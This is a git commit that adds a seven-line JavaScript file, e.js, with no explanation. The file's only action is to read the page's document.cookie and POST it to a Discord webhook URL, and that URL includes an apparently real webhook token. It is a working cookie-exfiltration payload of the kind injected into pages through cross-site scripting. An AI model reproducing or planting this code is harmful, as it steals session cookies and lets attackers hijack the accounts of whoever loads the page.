386a8358516b9cae943bfaf28d7103a2d6b42d2b
DarkCBZ <91396838+DarkCBZ@users.noreply.github.com>
2025-08-17 18:31:11 -0500

    Create e.js

---
+++ e.js
@@ -0,0 +1,7 @@
+fetch("https://discord.com/api/webhooks/1406776103917457548/OcKq96Hvc5ZumMVo6xTqVOivoMdjCUeW-38lIW8z2FGOBD07Jo8MzJq-d6OUJmpmwvfZ", { 
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({ content: document.cookie })
+});
